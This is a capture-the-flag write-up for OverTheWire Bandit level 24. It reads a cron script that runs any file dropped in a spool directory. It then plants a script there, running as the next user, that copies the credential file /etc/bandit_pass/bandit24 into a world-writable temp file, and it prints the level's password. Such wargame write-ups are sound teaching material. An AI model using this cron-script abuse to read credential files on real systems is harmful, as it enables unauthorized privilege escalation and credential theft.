# Overthewire - level 24

## Overview

### Category: General skill

### Description:
>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Exploitation
First, we'll read to see what the server is executing just like the latest challenge
```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
We can see that the files in */var/spool/bandit24/foo* will be executed (then deleted), so we'll need to create a bash file in that directory to send level 24's password to a temporary file
```bash
bandit23@bandit:/var/spool/bandit24/foo$ mktemp
/tmp/tmp.xoHGCaroN3
```
We'll then have to give permission to bandit24 to write on our file 
```bash
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 /tmp/tmp.xoHGCaroN3
bandit23@bandit:/var/spool/bandit24/foo$ ls -l /tmp/tmp.xoHGCaroN3
-rwxrwxrwx 1 bandit23 bandit23 0 Aug 18 05:14 /tmp/tmp.xoHGCaroN3
```
Then we'll create a bash file to grab level 24's password and pass the output into our temporary file
```bash
bandit23@bandit:/var/spool/bandit24/foo$ cat << 'EOF' > /var/spool/bandit24/foo/test9.sh
>#!/bin/bash
>{
>echo "Line 1"
>echo "Line 2"
>echo "Line 3"
>ls -la
>ls
>cat /etc/bandit_pass/bandit24
>} > /tmp/tmp.xoHGCaroN3
>EOF
```
Then, we'll have to give bandit24 executable permission on this file too
```bash
chmod 777 test9.sh
```
Then we'll check when our bash file is deleted, that is when the program inside were executed
```bash
bandit23@bandit:/var/spool/bandit24/foo$ cat test9.sh
#!/bin/bash
{
echo "Line 1"
echo "Line 2"
echo "Line 3"
ls -la
ls
cat /etc/bandit_pass/bandit24
} > /tmp/tmp.xoHGCaroN3
bandit23@bandit:/var/spool/bandit24/foo$ cat test9.sh
cat: test9.sh: No such file or directory
```
Then finally, we can read the result
```bash
cat /tmp/tmp.xoHGCaroN3
```
### Password
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv